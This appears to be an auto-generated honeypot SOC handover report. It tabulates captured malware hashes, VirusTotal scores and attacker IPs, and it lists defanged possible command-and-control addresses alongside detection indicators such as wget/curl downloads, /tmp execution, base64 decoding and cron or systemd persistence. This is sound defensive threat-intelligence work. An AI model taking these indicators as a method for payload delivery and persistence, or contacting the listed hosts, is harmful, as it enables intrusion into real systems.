| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `78.128.114[.]118` | BG | Tamatiya EOOD | **100** ⚠️ | 50 |
| `109.160.32[.]47` | NL | Global Communication Net Plc | **100** ⚠️ | 20 |
| `195.178.110[.]232` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `139.199.80[.]137` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 10 |
| `121.61.88[.]136` | CN | CHINANET Hubei province network | **100** ⚠️ | 2 |
| `66.132.195[.]119` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `89.21.67[.]176` | NL | Infrawatch Limited | **100** ⚠️ | 45 |
| `20.65.146[.]34` | US | Microsoft Corporation | **100** ⚠️ | 7 |
| `5.253.38[.]54` | US | Internet Utilities Europe and Asia Limited | **100** ⚠️ | 27 |
| `130.12.209[.]166` | AL | Osir, Inc. | **100** ⚠️ | 8 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 213 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 170 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 63 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 60 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 20 |

---

## 🔕 False Positive Summary (46 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 12 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 2 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 2 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 24 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 381 cases |
| Tool 34  | Credential Extractor        | ✅ 3531 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 28 fingerprints |
| Tool 36  | Command Clustering          | ✅ 16 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 258 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 46 filtered (12.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 119 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 34 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 167 priority case(s) shown individually · 159 recon entry/entries in table (9 group(s) consolidating 18 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-18T15:05:01Z_
